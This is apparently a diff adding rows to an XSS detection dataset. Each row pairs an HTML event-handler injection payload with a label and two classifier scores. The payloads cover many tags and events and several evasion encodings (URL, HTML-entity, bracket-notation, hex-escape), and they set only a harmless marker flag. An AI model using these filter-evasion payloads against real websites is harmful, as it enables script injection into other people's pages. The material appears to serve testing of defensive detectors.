+&#60;div draggable=&#34;true&#34; contenteditable&#62;drag me&#60;/div&#62;&#60;content ondrop=window.__xss_fired=true contenteditable&#62;drop here&#60;/content&#62;,0,0.99993265,0.9999256
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; contenteditable>drop here</content>",1,0.9999392,0.9999347
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=window['__xss_fired']=true contenteditable>drop here</content>",1,0.99993575,0.9999218
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=window['__xss'+'_fired']=true contenteditable>drop here</content>",1,0.99993753,0.999926
+"<div draggable=""true"" contenteditable>drag me</div><content ondrop=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true contenteditable>drop here</content>",1,0.9999249,0.9999205
+"<rt onmouseenter=""window.__xss_fired=true"">test</rt>",1,0.9999403,0.99993885
+%3crt%20onmouseenter%3d%22window.__xss_fired%3dtrue%22%3etest%3c/rt%3e,1,0.99993134,0.99993074
+&#60;rt onmouseenter=&#34;window.__xss_fired=true&#34;&#62;test&#60;/rt&#62;,0,0.99994075,0.99994135
+"<rt onmouseenter=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</rt>",1,0.9999405,0.99994254
+"<rt onmouseenter=""window['__xss_fired']=true"">test</rt>",1,0.9999397,0.99993527
+"<rt onmouseenter=""window['__xss'+'_fired']=true"">test</rt>",1,0.99994016,0.99993515
+"<rt onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</rt>",1,0.9999393,0.9999387
+"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=window.__xss_fired=true></del>",0,0.99993753,0.9999342
+%3cstyle%3e:target%20{color:red;}%3c/style%3e%3cdel%20id%3dx%20style%3d%22transition:color%201s%22%20ontransitionend%3dwindow.__xss_fired%3dtrue%3e%3c/del%3e,0,0.9998566,0.99971277
+&#60;style&#62;:target {color:red;}&#60;/style&#62;&#60;del id=x style=&#34;transition:color 1s&#34; ontransitionend=window.__xss_fired=true&#62;&#60;/del&#62;,0,0.99993694,0.99993384
+"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></del>",0,0.99993217,0.99992776
+"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=window['__xss_fired']=true></del>",0,0.9999354,0.9999268
+"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=window['__xss'+'_fired']=true></del>",0,0.99993503,0.99992454
+"<style>:target {color:red;}</style><del id=x style=""transition:color 1s"" ontransitionend=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></del>",0,0.999931,0.9999248
+"<html draggable=""true"" ondragenter=""window.__xss_fired=true"">test</html>",1,0.99993706,0.99993443
+%3chtml%20draggable%3d%22true%22%20ondragenter%3d%22window.__xss_fired%3dtrue%22%3etest%3c/html%3e,1,0.9999182,0.99990034
+&#60;html draggable=&#34;true&#34; ondragenter=&#34;window.__xss_fired=true&#34;&#62;test&#60;/html&#62;,0,0.99993813,0.99993753
+"<html draggable=""true"" ondragenter=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</html>",1,0.99994206,0.9999418
+"<html draggable=""true"" ondragenter=""window['__xss_fired']=true"">test</html>",1,0.99993634,0.9999312
+"<html draggable=""true"" ondragenter=""window['__xss'+'_fired']=true"">test</html>",1,0.9999392,0.99993324
+"<html draggable=""true"" ondragenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</html>",1,0.9999354,0.9999362
+"<ruby onmouseup=""window.__xss_fired=true"">test</ruby>",1,0.99994063,0.99993706
+%3cruby%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/ruby%3e,1,0.9999212,0.99991643
+&#60;ruby onmouseup=&#34;window.__xss_fired=true&#34;&#62;test&#60;/ruby&#62;,0,0.999938,0.999938
+"<ruby onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</ruby>",1,0.99993765,0.99993956
+"<ruby onmouseup=""window['__xss_fired']=true"">test</ruby>",1,0.99993896,0.99993265
+"<ruby onmouseup=""window['__xss'+'_fired']=true"">test</ruby>",1,0.9999393,0.9999331
+"<ruby onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</ruby>",1,0.999936,0.9999343
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""window.__xss_fired=true""></p>",1,0.99993837,0.9999331
+%3cstyle%3e@keyframes%20x{}%3c/style%3e%3cp%20style%3d%22animation-name:x%22%20onanimationend%3d%22window.__xss_fired%3dtrue%22%3e%3c/p%3e,1,0.99991083,0.9998895
+&#60;style&#62;@keyframes x{}&#60;/style&#62;&#60;p style=&#34;animation-name:x&#34; onanimationend=&#34;window.__xss_fired=true&#34;&#62;&#60;/p&#62;,0,0.99993885,0.9999374
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></p>",1,0.99993587,0.99993384
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""window['__xss_fired']=true""></p>",1,0.9999355,0.99992514
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""window['__xss'+'_fired']=true""></p>",1,0.9999335,0.9999213
+"<style>@keyframes x{}</style><p style=""animation-name:x"" onanimationend=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></p>",1,0.99992967,0.9999262
+<caption onpointerenter=window.__xss_fired=true>xss</caption>,0,0.9999356,0.9999366
+%3ccaption%20onpointerenter%3dwindow.__xss_fired%3dtrue%3exss%3c/caption%3e,0,0.99991333,0.99990845
+&#60;caption onpointerenter=window.__xss_fired=true&#62;xss&#60;/caption&#62;,0,0.99993634,0.9999386
+<caption onpointerenter=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</caption>,0,0.999936,0.9999391
+<caption onpointerenter=window['__xss_fired']=true>xss</caption>,0,0.9999366,0.99993443
+<caption onpointerenter=window['__xss'+'_fired']=true>xss</caption>,0,0.9999355,0.9999335
+<caption onpointerenter=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</caption>,0,0.99993587,0.9999343
+"<iframe onmouseup=""window.__xss_fired=true"">test</iframe>",1,0.99993694,0.99993277
+%3ciframe%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/iframe%3e,1,0.99992776,0.99992275
+&#60;iframe onmouseup=&#34;window.__xss_fired=true&#34;&#62;test&#60;/iframe&#62;,0,0.999938,0.9999386
+"<iframe onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</iframe>",1,0.9999386,0.99994195
+"<iframe onmouseup=""window['__xss_fired']=true"">test</iframe>",1,0.9999366,0.99993
+"<iframe onmouseup=""window['__xss'+'_fired']=true"">test</iframe>",1,0.9999374,0.9999329
+"<iframe onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</iframe>",1,0.9999274,0.9999275
+<dir id=x tabindex=1 onfocusin=window.__xss_fired=true></dir>,1,0.9999323,0.9999317
+%3cdir%20id%3dx%20tabindex%3d1%20onfocusin%3dwindow.__xss_fired%3dtrue%3e%3c/dir%3e,1,0.9999056,0.9998976
+&#60;dir id=x tabindex=1 onfocusin=window.__xss_fired=true&#62;&#60;/dir&#62;,0,0.99993145,0.9999317
+<dir id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></dir>,1,0.99993026,0.99993074
+<dir id=x tabindex=1 onfocusin=window['__xss_fired']=true></dir>,1,0.9999324,0.9999268
+<dir id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></dir>,1,0.99993336,0.9999263
+<dir id=x tabindex=1 onfocusin=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></dir>,1,0.9999273,0.9999267
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window.__xss_fired=true""></map>",1,0.9999114,0.9998627
+%3cstyle%3e@keyframes%20slidein%20{}%3c/style%3e%3cmap%20style%3d%22animation-duration:1s;animation-name:slidein;animation-iteration-count:2%22%20onanimationiteration%3d%22window.__xss_fired%3dtrue%22%3e%3c/map%3e,1,0.9998313,0.99946374
+&#60;style&#62;@keyframes slidein {}&#60;/style&#62;&#60;map style=&#34;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&#34; onanimationiteration=&#34;window.__xss_fired=true&#34;&#62;&#60;/map&#62;,0,0.9999368,0.9999325
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></map>",1,0.99991786,0.9998765
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss_fired']=true""></map>",1,0.999882,0.99976426
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss'+'_fired']=true""></map>",1,0.99986386,0.99974674
+"<style>@keyframes slidein {}</style><map style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></map>",1,0.99988985,0.9998754
+<kbd id=x tabindex=1 onfocusin=window.__xss_fired=true></kbd>,1,0.99993014,0.9999292
+%3ckbd%20id%3dx%20tabindex%3d1%20onfocusin%3dwindow.__xss_fired%3dtrue%3e%3c/kbd%3e,1,0.9999013,0.9998783
+&#60;kbd id=x tabindex=1 onfocusin=window.__xss_fired=true&#62;&#60;/kbd&#62;,0,0.9999336,0.9999337
+<kbd id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></kbd>,1,0.999931,0.99993145
+<kbd id=x tabindex=1 onfocusin=window['__xss_fired']=true></kbd>,1,0.99993086,0.99992573
+<kbd id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></kbd>,1,0.9999336,0.99992776
+<kbd id=x tabindex=1 onfocusin=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></kbd>,1,0.99992836,0.9999273
+"<optgroup onbeforecopy=""window.__xss_fired=true"" contenteditable>test</optgroup>",1,0.9999403,0.9999329
+%3coptgroup%20onbeforecopy%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/optgroup%3e,1,0.999913,0.99987817
+&#60;optgroup onbeforecopy=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/optgroup&#62;,0,0.99993944,0.99993706
+"<optgroup onbeforecopy=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</optgroup>",1,0.9999367,0.99993324
+"<optgroup onbeforecopy=""window['__xss_fired']=true"" contenteditable>test</optgroup>",1,0.9999366,0.9999212
+"<optgroup onbeforecopy=""window['__xss'+'_fired']=true"" contenteditable>test</optgroup>",1,0.999933,0.99991596
+"<optgroup onbeforecopy=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</optgroup>",1,0.9999312,0.9999268
+<s id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true></s><input autofocus>,0,0.99993265,0.99993277
+%3cs%20id%3dx%20tabindex%3d1%20onbeforedeactivate%3dwindow.__xss_fired%3dtrue%3e%3c/s%3e%3cinput%20autofocus%3e,0,0.9998946,0.9998852
+&#60;s id=x tabindex=1 onbeforedeactivate=window.__xss_fired=true&#62;&#60;/s&#62;&#60;input autofocus&#62;,0,0.9999318,0.9999329
+<s id=x tabindex=1 onbeforedeactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></s><input autofocus>,0,0.9999342,0.9999362
+<s id=x tabindex=1 onbeforedeactivate=window['__xss_fired']=true></s><input autofocus>,0,0.9999336,0.99993265
+<s id=x tabindex=1 onbeforedeactivate=window['__xss'+'_fired']=true></s><input autofocus>,0,0.99993694,0.999936
+<s id=x tabindex=1 onbeforedeactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></s><input autofocus>,0,0.9999324,0.999933
+"<col onmouseenter=""window.__xss_fired=true"">test</col>",0,0.99993813,0.9999323
+%3ccol%20onmouseenter%3d%22window.__xss_fired%3dtrue%22%3etest%3c/col%3e,0,0.99992824,0.999928
+&#60;col onmouseenter=&#34;window.__xss_fired=true&#34;&#62;test&#60;/col&#62;,0,0.9999393,0.9999392
+"<col onmouseenter=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</col>",0,0.9999403,0.99994004
+"<col onmouseenter=""window['__xss_fired']=true"">test</col>",0,0.99993753,0.9999286
+"<col onmouseenter=""window['__xss'+'_fired']=true"">test</col>",0,0.99993837,0.99993074
+"<col onmouseenter=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</col>",0,0.9999368,0.9999367
+"<section oncontextmenu=""window.__xss_fired=true"">test</section>",1,0.99993086,0.9999174
+%3csection%20oncontextmenu%3d%22window.__xss_fired%3dtrue%22%3etest%3c/section%3e,1,0.9999051,0.9998907
+&#60;section oncontextmenu=&#34;window.__xss_fired=true&#34;&#62;test&#60;/section&#62;,0,0.99993527,0.9999336
+"<section oncontextmenu=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</section>",1,0.9999361,0.99992895
+"<section oncontextmenu=""window['__xss_fired']=true"">test</section>",1,0.9999213,0.9998914
+"<section oncontextmenu=""window['__xss'+'_fired']=true"">test</section>",1,0.99992406,0.9998983
+"<section oncontextmenu=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</section>",1,0.99991894,0.99991417
+<canvas onpointerdown=window.__xss_fired=true>xss</canvas>,1,0.9999403,0.9999391
+%3ccanvas%20onpointerdown%3dwindow.__xss_fired%3dtrue%3exss%3c/canvas%3e,1,0.99992263,0.9999212
+&#60;canvas onpointerdown=window.__xss_fired=true&#62;xss&#60;/canvas&#62;,0,0.99994004,0.9999403
+<canvas onpointerdown=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</canvas>,1,0.9999361,0.9999399
+<canvas onpointerdown=window['__xss_fired']=true>xss</canvas>,1,0.9999393,0.9999356
+<canvas onpointerdown=window['__xss'+'_fired']=true>xss</canvas>,1,0.9999378,0.99993396
+<canvas onpointerdown=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</canvas>,1,0.99993956,0.9999392
+"<address onkeydown=""window.__xss_fired=true"" contenteditable>test</address>",1,0.99994326,0.99993813
+%3caddress%20onkeydown%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/address%3e,1,0.9999186,0.9998994
+&#60;address onkeydown=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/address&#62;,0,0.9999378,0.99993706
+"<address onkeydown=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</address>",1,0.9999367,0.9999399
+"<address onkeydown=""window['__xss_fired']=true"" contenteditable>test</address>",1,0.9999405,0.9999324
+"<address onkeydown=""window['__xss'+'_fired']=true"" contenteditable>test</address>",1,0.99993813,0.99992883
+"<address onkeydown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</address>",1,0.99993694,0.9999356
+"<noframes draggable=""true"" ondrag=""window.__xss_fired=true"">test</noframes>",1,0.99993515,0.99992955
+%3cnoframes%20draggable%3d%22true%22%20ondrag%3d%22window.__xss_fired%3dtrue%22%3etest%3c/noframes%3e,1,0.9999068,0.9998722
+&#60;noframes draggable=&#34;true&#34; ondrag=&#34;window.__xss_fired=true&#34;&#62;test&#60;/noframes&#62;,0,0.9999379,0.9999349
+"<noframes draggable=""true"" ondrag=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</noframes>",1,0.9999398,0.9999379
+"<noframes draggable=""true"" ondrag=""window['__xss_fired']=true"">test</noframes>",1,0.9999337,0.99992466
+"<noframes draggable=""true"" ondrag=""window['__xss'+'_fired']=true"">test</noframes>",1,0.9999362,0.99992573
+"<noframes draggable=""true"" ondrag=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</noframes>",1,0.99993,0.9999311
+"<nobr oncontextmenu=""window.__xss_fired=true"">test</nobr>",1,0.9999362,0.9999299
+%3cnobr%20oncontextmenu%3d%22window.__xss_fired%3dtrue%22%3etest%3c/nobr%3e,1,0.99992085,0.99991846
+&#60;nobr oncontextmenu=&#34;window.__xss_fired=true&#34;&#62;test&#60;/nobr&#62;,0,0.9999337,0.9999336
+"<nobr oncontextmenu=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</nobr>",1,0.99993515,0.9999336
+"<nobr oncontextmenu=""window['__xss_fired']=true"">test</nobr>",1,0.9999305,0.99991405
+"<nobr oncontextmenu=""window['__xss'+'_fired']=true"">test</nobr>",1,0.999928,0.9999099
+"<nobr oncontextmenu=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</nobr>",1,0.99993026,0.9999269
+<small id=x tabindex=1 onfocusin=window.__xss_fired=true></small>,1,0.9999356,0.99993205
+%3csmall%20id%3dx%20tabindex%3d1%20onfocusin%3dwindow.__xss_fired%3dtrue%3e%3c/small%3e,1,0.99987507,0.99978787
+&#60;small id=x tabindex=1 onfocusin=window.__xss_fired=true&#62;&#60;/small&#62;,0,0.99993575,0.9999343
+<small id=x tabindex=1 onfocusin=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></small>,1,0.99993217,0.9999316
+<small id=x tabindex=1 onfocusin=window['__xss_fired']=true></small>,1,0.99993455,0.999926
+<small id=x tabindex=1 onfocusin=window['__xss'+'_fired']=true></small>,1,0.9999354,0.99992394
+<small id=x tabindex=1 onfocusin=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></small>,1,0.99993,0.99992776
+"<template onmousemove=""window.__xss_fired=true"">test</template>",1,0.99993813,0.99992955
+%3ctemplate%20onmousemove%3d%22window.__xss_fired%3dtrue%22%3etest%3c/template%3e,1,0.9999225,0.9999162
+&#60;template onmousemove=&#34;window.__xss_fired=true&#34;&#62;test&#60;/template&#62;,0,0.9999397,0.9999385
+"<template onmousemove=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</template>",1,0.9999386,0.99993694
+"<template onmousemove=""window['__xss_fired']=true"">test</template>",1,0.9999324,0.9999138
+"<template onmousemove=""window['__xss'+'_fired']=true"">test</template>",1,0.9999316,0.999915
+"<template onmousemove=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</template>",1,0.99993443,0.99993074
+"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=window.__xss_fired=true contenteditable>drop here</frame>",0,0.9999391,0.9999337
+%3cdiv%20draggable%3d%22true%22%20contenteditable%3edrag%20me%3c/div%3e%3cframe%20ondrop%3dwindow.__xss_fired%3dtrue%20contenteditable%3edrop%20here%3c/frame%3e,0,0.9996501,0.9989178
+&#60;div draggable=&#34;true&#34; contenteditable&#62;drag me&#60;/div&#62;&#60;frame ondrop=window.__xss_fired=true contenteditable&#62;drop here&#60;/frame&#62;,0,0.99993324,0.9999293
+"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101; contenteditable>drop here</frame>",0,0.99993944,0.99993646
+"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=window['__xss_fired']=true contenteditable>drop here</frame>",0,0.99993706,0.9999268
+"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=window['__xss'+'_fired']=true contenteditable>drop here</frame>",0,0.99993825,0.9999285
+"<div draggable=""true"" contenteditable>drag me</div><frame ondrop=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true contenteditable>drop here</frame>",0,0.9999249,0.99992025
+<slot id=x tabindex=1 onfocus=window.__xss_fired=true></slot>,0,0.999928,0.99992144
+%3cslot%20id%3dx%20tabindex%3d1%20onfocus%3dwindow.__xss_fired%3dtrue%3e%3c/slot%3e,0,0.9998797,0.9998066
+&#60;slot id=x tabindex=1 onfocus=window.__xss_fired=true&#62;&#60;/slot&#62;,0,0.9999287,0.9999285
+<slot id=x tabindex=1 onfocus=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></slot>,0,0.99992967,0.9999256
+<slot id=x tabindex=1 onfocus=window['__xss_fired']=true></slot>,0,0.99992454,0.99990964
+<slot id=x tabindex=1 onfocus=window['__xss'+'_fired']=true></slot>,0,0.9999261,0.9999069
+<slot id=x tabindex=1 onfocus=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></slot>,0,0.9999225,0.99991953
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""window.__xss_fired=true""></menu>",1,0.99988997,0.9998549
+%3cstyle%3e@keyframes%20x{from%20{left:0;}to%20{left:%201000px;}}:target%20{animation:10s%20ease-in-out%200s%201%20x;}%3c/style%3e%3cmenu%20id%3dx%20style%3d%22position:absolute;%22%20onanimationcancel%3d%22window.__xss_fired%3dtrue%22%3e%3c/menu%3e,1,0.99939394,0.9962011
+&#60;style&#62;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&#60;/style&#62;&#60;menu id=x style=&#34;position:absolute;&#34; onanimationcancel=&#34;window.__xss_fired=true&#34;&#62;&#60;/menu&#62;,0,0.99989784,0.999879
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></menu>",1,0.999892,0.99981767
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""window['__xss_fired']=true""></menu>",1,0.99987566,0.9997991
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""window['__xss'+'_fired']=true""></menu>",1,0.9998671,0.99979097
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=""position:absolute;"" onanimationcancel=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></menu>",1,0.9998673,0.99982077
+"<progress onkeydown=""window.__xss_fired=true"" contenteditable>test</progress>",1,0.99994373,0.9999405
+%3cprogress%20onkeydown%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/progress%3e,1,0.99992037,0.99989545
+&#60;progress onkeydown=&#34;window.__xss_fired=true&#34; contenteditable&#62;test&#60;/progress&#62;,0,0.9999405,0.99993944
+"<progress onkeydown=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"" contenteditable>test</progress>",1,0.99993956,0.99994254
+"<progress onkeydown=""window['__xss_fired']=true"" contenteditable>test</progress>",1,0.999943,0.9999379
+"<progress onkeydown=""window['__xss'+'_fired']=true"" contenteditable>test</progress>",1,0.99994195,0.9999356
+"<progress onkeydown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"" contenteditable>test</progress>",1,0.9999379,0.99993813
+<output onpointerover=window.__xss_fired=true>xss</output>,1,0.9999404,0.9999393
+%3coutput%20onpointerover%3dwindow.__xss_fired%3dtrue%3exss%3c/output%3e,1,0.9999193,0.99991775
+&#60;output onpointerover=window.__xss_fired=true&#62;xss&#60;/output&#62;,0,0.9999387,0.99993813
+<output onpointerover=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;>xss</output>,1,0.9999323,0.99993706
+<output onpointerover=window['__xss_fired']=true>xss</output>,1,0.9999403,0.9999378
+<output onpointerover=window['__xss'+'_fired']=true>xss</output>,1,0.9999393,0.999936
+<output onpointerover=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true>xss</output>,1,0.9999393,0.9999398
+"<sub onmouseup=""window.__xss_fired=true"">test</sub>",1,0.99994016,0.99993277
+%3csub%20onmouseup%3d%22window.__xss_fired%3dtrue%22%3etest%3c/sub%3e,1,0.99992704,0.99992645
+&#60;sub onmouseup=&#34;window.__xss_fired=true&#34;&#62;test&#60;/sub&#62;,0,0.9999398,0.9999391
+"<sub onmouseup=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</sub>",1,0.9999386,0.9999391
+"<sub onmouseup=""window['__xss_fired']=true"">test</sub>",1,0.9999374,0.99992466
+"<sub onmouseup=""window['__xss'+'_fired']=true"">test</sub>",1,0.9999368,0.99992406
+"<sub onmouseup=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</sub>",1,0.9999347,0.9999341
+"<s onmousedown=""window.__xss_fired=true"">test</s>",1,0.9999318,0.9999112
+%3cs%20onmousedown%3d%22window.__xss_fired%3dtrue%22%3etest%3c/s%3e,1,0.9999212,0.99991596
+&#60;s onmousedown=&#34;window.__xss_fired=true&#34;&#62;test&#60;/s&#62;,0,0.99993765,0.9999372
+"<s onmousedown=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;"">test</s>",1,0.9999354,0.99993587
+"<s onmousedown=""window['__xss_fired']=true"">test</s>",1,0.99992895,0.99988747
+"<s onmousedown=""window['__xss'+'_fired']=true"">test</s>",1,0.9999325,0.99990654
+"<s onmousedown=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true"">test</s>",1,0.9999312,0.99993074
+"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window.__xss_fired=true""></html>",1,0.9999155,0.9998807
+%3cstyle%3e@keyframes%20slidein%20{}%3c/style%3e%3chtml%20style%3d%22animation-duration:1s;animation-name:slidein;animation-iteration-count:2%22%20onanimationiteration%3d%22window.__xss_fired%3dtrue%22%3e%3c/html%3e,1,0.9998609,0.99966455
+&#60;style&#62;@keyframes slidein {}&#60;/style&#62;&#60;html style=&#34;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&#34; onanimationiteration=&#34;window.__xss_fired=true&#34;&#62;&#60;/html&#62;,0,0.99993587,0.9999317
+"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;""></html>",1,0.9999211,0.9998863
+"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss_fired']=true""></html>",1,0.9998982,0.9998093
+"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['__xss'+'_fired']=true""></html>",1,0.99988925,0.9998099
+"<style>@keyframes slidein {}</style><html style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true""></html>",1,0.99990165,0.999892
+<datalist id=x tabindex=1 onactivate=window.__xss_fired=true></datalist>,0,0.99993265,0.99993014
+%3cdatalist%20id%3dx%20tabindex%3d1%20onactivate%3dwindow.__xss_fired%3dtrue%3e%3c/datalist%3e,0,0.99989057,0.9998467
+&#60;datalist id=x tabindex=1 onactivate=window.__xss_fired=true&#62;&#60;/datalist&#62;,0,0.9999337,0.99993384
+<datalist id=x tabindex=1 onactivate=&#119;&#105;nd&#111;&#119;.__xss_f&#105;r&#101;d=tr&#117;&#101;></datalist>,0,0.9999343,0.9999354
+<datalist id=x tabindex=1 onactivate=window['__xss_fired']=true></datalist>,0,0.9999312,0.9999255
+<datalist id=x tabindex=1 onactivate=window['__xss'+'_fired']=true></datalist>,0,0.9999348,0.9999287
+<datalist id=x tabindex=1 onactivate=window['\x5f\x5f\x78\x73\x73\x5f\x66\x69\x72\x65\x64']=true></datalist>,0,0.9999274,0.99992704
+"<mark oncut=""window.__xss_fired=true"" contenteditable>test</mark>",1,0.9999409,0.9999329
+%3cmark%20oncut%3d%22window.__xss_fired%3dtrue%22%20contenteditable%3etest%3c/mark%3e,1,0.9999088,0.9998697
